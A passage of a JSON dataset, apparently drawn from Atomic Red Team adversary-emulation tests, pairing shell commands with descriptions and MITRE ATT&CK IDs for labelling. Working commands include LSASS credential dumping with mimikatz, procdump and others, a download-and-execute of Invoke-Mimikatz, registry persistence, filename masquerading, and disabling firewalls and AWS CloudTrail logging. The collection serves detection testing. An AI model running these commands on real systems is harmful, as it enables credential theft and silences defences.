        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "command_prompt"
    },
    {
        "ID": 452,
        "Command": "aws iam get-account-password-policy\n",
        "Description": "This atomic test will display details about the password policy for the current AWS account.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "sh"
    },
    {
        "ID": 453,
        "Command": "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt\" > %temp%\\art.bat\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f\n",
        "Description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 454,
        "Command": "Start-Process -FilePath \"$PathToAtomicsFolder\\..\\ExternalPayloads\\ahk\\AutoHotKeyU64.exe\" -ArgumentList \"PathToAtomicsFolder\\T1059.010\\src\\calc.ahk\"\n",
        "Description": "An adversary may attempt to execute malicious script using AutoHotKey software instead of regular terminal like powershell or cmd. A messagebox will be displayed and calculator will popup when the script is executed successfully\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.010",
        "Shell": "powershell"
    },
    {
        "ID": 455,
        "Command": "1. echo '#!/bin/bash\\necho \"print \\\"hello, world!\\\"\" | /usr/bin/python\\nexit' > execute.txt && chmod +x execute.txt\n\n2. mv execute.txt \"execute.txt \"\n\n3. ./execute.txt\\ \n",
        "Description": "Space After Filename\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.006",
        "Shell": "manual"
    },
    {
        "ID": 456,
        "Command": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n[ \"$(uname)\" = 'FreeBSD' ] && /bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \" || /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n",
        "Description": "Space after filename.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.006",
        "Shell": "sh"
    },
    {
        "ID": 457,
        "Command": "cat /etc/passwd > /tmp/T1087.001.txt\ncat /tmp/T1087.001.txt\n",
        "Description": "Enumerate all accounts by copying /etc/passwd to another file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 458,
        "Command": "if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > /tmp/T1087.001.txt; fi;\nif [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > /tmp/T1087.001.txt; fi;\ncat /tmp/T1087.001.txt\n",
        "Description": "(requires root)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 459,
        "Command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt\ngrep '*:0:' /etc/passwd >> /tmp/T1087.001.txt\ncat /tmp/T1087.001.txt 2>/dev/null\n",
        "Description": "View accounts with UID 0\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 460,
        "Command": "username=$(id -u -n) && lsof -u $username\n",
        "Description": "List opened files by user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 461,
        "Command": "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" \n$cmd > /tmp/T1087.001.txt\ncat /tmp/T1087.001.txt\n",
        "Description": "Show if a user account has ever logged in remotely\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 462,
        "Command": "groups\nid\n",
        "Description": "Utilize groups and id to enumerate users and groups\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 463,
        "Command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n",
        "Description": "Utilize local utilities to enumerate users and groups\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "sh"
    },
    {
        "ID": 464,
        "Command": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n",
        "Description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 465,
        "Command": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n",
        "Description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "powershell"
    },
    {
        "ID": 466,
        "Command": "query user\n",
        "Description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 467,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" -batch \"atomic.local\" -ssh -l root -pw \"password\" \"esxcli system account list\"\n",
        "Description": "An adversary can use ESXCLI to enumerate a list of all local accounts on an ESXi host.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/#account%20enumeration)\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 468,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\"\n",
        "Description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 469,
        "Command": "Invoke-Expression \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\"\n",
        "Description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.004",
        "Shell": "powershell"
    },
    {
        "ID": 470,
        "Command": "gcc PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out\nclang PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out\n",
        "Description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.004",
        "Shell": "sh"
    },
    {
        "ID": 471,
        "Command": "g++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out\nclang++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out\n",
        "Description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.004",
        "Shell": "sh"
    },
    {
        "ID": 472,
        "Command": "go run PathToAtomicsFolder/T1027.004/src/T1027-004-test.go\n",
        "Description": "Compile a go file with golang on FreeBSD, Linux or Macos.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.004",
        "Shell": "sh"
    },
    {
        "ID": 473,
        "Command": "regsvr32.exe PathToAtomicsFolder\\T1553.003\\bin\\GTSIPProvider.dll\n",
        "Description": "Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing\nthe system to utilize it during signature checks, and logging said checks.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 474,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 475,
        "Command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "powershell"
    },
    {
        "ID": 476,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\"\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 477,
        "Command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n",
        "Description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 478,
        "Command": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "manual"
    },
    {
        "ID": 479,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 480,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\" live lsa \n",
        "Description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 481,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "powershell"
    },
    {
        "ID": 482,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 483,
        "Command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n",
        "Description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "powershell"
    },
    {
        "ID": 484,
        "Command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
        "Description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "powershell"
    },
    {
        "ID": 485,
        "Command": "C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "powershell"
    },
    {
        "ID": 486,
        "Command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n\\t  $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n\\t  $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n\\t  $binary_path = \"File not found\"\n\\t  exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
        "Description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "powershell"
    },
    {
        "ID": 487,
        "Command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"%temp%\\SilentProcessExit\"\n",
        "Description": "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender’s viewpoint it’s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 488,
        "Command": "launchctl submit -l evil -- /System/Applications/Calculator.app/Contents/MacOS/Calculator\n",
        "Description": "Utilize launchctl\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.001",
        "Shell": "bash"
    },
    {
        "ID": 489,
        "Command": "netsh advfirewall set currentprofile state off\n",
        "Description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 490,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n",
        "Description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 491,
        "Command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\nnetsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes\n",
        "Description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 492,
        "Command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450 \n",
        "Description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 493,
        "Command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any",
        "Description": "This test will attempt to open a local port defined by input arguments to any profile",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "powershell"
    },
    {
        "ID": 494,
        "Command": "Copy-Item \"PathToAtomicsFolder\\T1562.004\\bin\\AtomicTest.exe\" -Destination \"C:\\Users\\$env:UserName\" -Force\nnetsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes\n",
        "Description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "powershell"
    },
    {
        "ID": 495,
        "Command": "ufw disable\n",
        "Description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 496,
        "Command": "service pf stop\nservice pf disable\n",
        "Description": "Stop the Packet Filter if installed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 497,
        "Command": "systemctl stop ufw\n",
        "Description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 498,
        "Command": "ufw logging off\n",
        "Description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 499,
        "Command": "ufw prepend deny from 1.2.3.4\nufw status numbered\n",
        "Description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 500,
        "Command": "echo \"block in proto tcp from 1.2.3.4 to any\" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n",
        "Description": "Add and delete a rule on the Packet Filter (PF) if installed and enabled. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 501,
        "Command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules\ngrep \"# THIS IS A COMMENT\" /etc/ufw/user.rules\n",
        "Description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 502,
        "Command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf\n",
        "Description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 503,
        "Command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf\n",
        "Description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 504,
        "Command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw\ngrep \"# THIS IS A COMMENT\" /etc/default/ufw\n",
        "Description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 505,
        "Command": "tail /var/log/ufw.log\n",
        "Description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 506,
        "Command": "iptables-save > /tmp/iptables.rules\niptables -F\n",
        "Description": "Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) \nAttackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables \nrules, which in fact \"disable\" iptables. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 507,
        "Command": "iptables -D OUTPUT -p tcp --dport 21 -j DROP\n",
        "Description": "Instead of completely \"disabling\" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.\nBy doing so, they may cause less noise to avoid detection. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "sh"
    },
    {
        "ID": 508,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\n",
        "Description": "An adversary tries to modify the windows firewall registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 509,
        "Command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\n",
        "Description": "An adversary tries to modify the windows firewall registry.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "powershell"
    },
    {
        "ID": 510,
        "Command": "netsh firewall set opmode mode=disable\n",
        "Description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 511,
        "Command": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\\..\\atomics\\T1562.004\\src\\esxi_disable_firewall.txt\n",
        "Description": "Adversaries may disable the ESXI firewall via ESXCLI\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 512,
        "Command": "New-NetFirewallRule -DisplayName \"New rule\" -Direction \"Inbound\" -LocalPort \"21\" -Protocol \"TCP\" -Action \"allow\"",
        "Description": "This test will attempt to create a new inbound/outbound firewall rule using the New-NetFirewallRule commandlet.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "powershell"
    },
    {
        "ID": 513,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" -batch \"atomic.local\" -ssh -l root -pw \"password\" \"esxcli network firewall set --default-action true\"\n",
        "Description": "This test sets the default ESXi firewall action to PASS instead of DROP. This allows all incoming and outgoing traffic.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 514,
        "Command": "aws cloudtrail update-trail --name redatomictesttrail --s3-bucket-name redatomic-test  --is-multi-region-trail --region us-east-1\naws cloudtrail stop-logging --name redatomictesttrail --region us-east-1\naws cloudtrail delete-trail --name redatomictesttrail --region us-east-1\n",
        "Description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 515,
        "Command": "$secure_pwd = \"\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"\", $secure_pwd\nConnect-AzureAD -Credential $creds\nRemove-AzEventHub -ResourceGroupName  -Namespace  -Name test_eventhub\n",
